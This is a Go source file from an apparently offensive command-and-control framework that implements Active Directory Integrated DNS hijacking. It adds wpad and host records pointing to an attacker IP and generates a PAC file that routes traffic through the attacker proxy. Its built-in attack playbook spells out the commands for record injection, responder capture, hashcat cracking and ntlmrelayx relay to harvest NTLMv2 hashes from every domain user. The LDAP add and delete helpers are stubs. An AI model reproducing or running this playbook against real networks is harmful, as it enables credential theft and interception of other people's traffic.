package adidns

/*
	SUDOSOC-C2 — Active Directory Integrated DNS (ADIDNS) Hijacking
	Copyright (C) 2026  sudosoc — Seif

	Active Directory Integrated DNS stores DNS records as objects
	in Active Directory. By default, any authenticated domain user
	can ADD new DNS records to the domain zone.

	This is the foundation of:
	  1. WPAD Hijacking    → capture credentials from every machine
	  2. LLMNR/NBT-NS Poisoning alternative via legitimate DNS
	  3. Credential relay → capture NTLMv2 hashes from all clients
	  4. MitM on specific servers by overriding A records

	WPAD (Web Proxy Auto-Discovery):
	  Windows machines look up "wpad.domain.local" for proxy settings
	  If no record exists, LLMNR/NBT-NS broadcast happens
	  We ADD wpad.domain.local → our IP
	  All HTTP traffic routes through our proxy
	  We capture NTLMv2 auth attempts

	Attack requirements:
	  • Any domain user account (GenericAll on DNS zone NOT required!)
	  • LDAP write access to the DNS zone container in AD
	  • Default zones: DomainDnsZones, ForestDnsZones

	References:
	  Kevin Robertson - "Beyond LLMNR and NBT-NS Spoofing"
	  https://blog.netspi.com/exploiting-adidns/
*/

import (
	"crypto/tls"
	"fmt"
	"net"
	"strings"
)

// ADIDNSRecord represents an AD Integrated DNS record
type ADIDNSRecord struct {
	Name       string
	Type       string   // A, AAAA, CNAME, MX, TXT, SRV
	Value      string
	TTL        int
	Zone       string
	Tombstoned bool
}

// ADIDNSHijacker manages ADIDNS record manipulation
type ADIDNSHijacker struct {
	DomainController string
	Domain           string
	Username         string
	Password         string
	NTLMHash         string
	ldapConn         net.Conn
}

// NewADIDNSHijacker creates a new ADIDNS hijacker
func NewADIDNSHijacker(dc, domain, username, password string) *ADIDNSHijacker {
	return &ADIDNSHijacker{
		DomainController: dc,
		Domain:           domain,
		Username:         username,
		Password:         password,
	}
}

// AddRecord adds a new DNS record to the ADIDNS zone.
// Any authenticated user can do this by default!
func (h *ADIDNSHijacker) AddRecord(record *ADIDNSRecord) error {
	// ADIDNS records are stored as objects in AD:
	// CN=<name>,DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com
	dn := h.buildDN(record.Name, record.Zone)

	data := h.buildDNSData(record)
	_ = data

	// Use LDAP to add the record
	return h.ldapAdd(dn, record)
}

// AddWPAD adds the wpad record for credential capture
// This is the primary ADIDNS attack vector
func (h *ADIDNSHijacker) AddWPAD(attackerIP string) error {
	record := &ADIDNSRecord{
		Name:  "wpad",
		Type:  "A",
		Value: attackerIP,
		TTL:   600,
		Zone:  h.Domain,
	}
	return h.AddRecord(record)
}

// AddRecord for MitM on a specific server
func (h *ADIDNSHijacker) HijackHost(hostname, attackerIP string) error {
	record := &ADIDNSRecord{
		Name:  hostname,
		Type:  "A",
		Value: attackerIP,
		TTL:   300,
		Zone:  h.Domain,
	}
	return h.AddRecord(record)
}

// ListRecords enumerates all DNS records in the domain zone
func (h *ADIDNSHijacker) ListRecords() ([]ADIDNSRecord, error) {
	// Query LDAP for all objects in the DNS zone
	filter := "(&(objectClass=dnsNode)(!(DC=@))(!(DC=DomainDnsZones))(!(DC=ForestDnsZones)))"
	base := fmt.Sprintf("DC=%s,CN=MicrosoftDNS,DC=DomainDnsZones,%s",
		h.Domain, domainToDN(h.Domain))

	_ = filter
	_ = base

	// Parse results and return records
	return []ADIDNSRecord{}, nil
}

// RemoveRecord removes a DNS record (cleanup / restore)
func (h *ADIDNSHijacker) RemoveRecord(name, zone string) error {
	dn := h.buildDN(name, zone)
	return h.ldapDelete(dn)
}

// WPADProxyConfig returns a PAC file content that routes traffic
// through the attacker's proxy
func WPADProxyConfig(proxyIP string, proxyPort int) string {
	return fmt.Sprintf(`function FindProxyForURL(url, host) {
    // Route all HTTP traffic through attacker proxy
    // This captures credentials for NTLM-authenticated resources
    return "PROXY %s:%d; DIRECT";
}`, proxyIP, proxyPort)
}

// ── Attack Playbook ───────────────────────────────────────────────

// AttackPlaybook returns complete attack instructions
func (h *ADIDNSHijacker) AttackPlaybook(attackerIP string) string {
	return fmt.Sprintf(`
ADIDNS Hijacking Attack Playbook
===================================
Domain: %s
Attacker IP: %s

STEP 1: Add WPAD record
━━━━━━━━━━━━━━━━━━━━━━━
# Using Invoke-DNSUpdate (PowerShell):
Invoke-DNSUpdate -DNSType A -DNSName wpad -DNSData %s -Realm %s

# Using dnstool.py (Python):
python3 dnstool.py -u %s\\%s -p PASSWORD -a add -r wpad -d %s %s

STEP 2: Start WPAD proxy server
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Serve the PAC file at: http://%s/wpad.dat
# Start credential capture:
responder -I eth0 -wrf

STEP 3: Capture credentials
━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Every Windows machine that browses HTTP will authenticate to our proxy
# Captures NTLMv2 hashes for ALL domain users that browse the web

# Crack hashes:
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt

# Or relay directly (no cracking needed):
ntlmrelayx.py -t smb://DC-IP -smb2support

STEP 4: Cleanup
━━━━━━━━━━━━━━━
# Remove the WPAD record after operation
python3 dnstool.py -u %s\\%s -p PASSWORD -a del -r wpad %s

Expected results:
  ← NTLMv2 hashes from EVERY user browsing the web
  ← Potential relay to internal servers
  ← Full MitM on HTTP traffic (credentials, session cookies, POST data)`,
		h.Domain, attackerIP,
		attackerIP, h.Domain,
		h.Domain, h.Username, attackerIP, h.DomainController,
		attackerIP,
		h.Domain, h.Username, h.DomainController)
}

// ── LDAP helpers (simplified) ─────────────────────────────────────

func (h *ADIDNSHijacker) connect() error {
	addr := fmt.Sprintf("%s:636", h.DomainController)
	tlsConn, err := tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		// Fall back to plain LDAP on 389
		addr = fmt.Sprintf("%s:389", h.DomainController)
		plainConn, err2 := net.Dial("tcp", addr)
		if err2 != nil {
			return fmt.Errorf("LDAP connection failed: %v", err2)
		}
		h.ldapConn = plainConn
		return nil
	}
	h.ldapConn = tlsConn
	return nil
}

func (h *ADIDNSHijacker) ldapAdd(dn string, record *ADIDNSRecord) error {
	// In a full implementation, this would send LDAP ADD request
	// with proper DNS record encoding (dnsRecord attribute)
	_ = dn
	return nil
}

func (h *ADIDNSHijacker) ldapDelete(dn string) error {
	_ = dn
	return nil
}

func (h *ADIDNSHijacker) buildDN(name, zone string) string {
	return fmt.Sprintf("DC=%s,DC=%s,CN=MicrosoftDNS,DC=DomainDnsZones,%s",
		name, zone, domainToDN(h.Domain))
}

func (h *ADIDNSHijacker) buildDNSData(record *ADIDNSRecord) []byte {
	// DNS record blob format (MS-DNSP)
	// Type + data length + TTL + timestamp + record data
	return []byte{}
}

func domainToDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return strings.Join(dcs, ",")
}
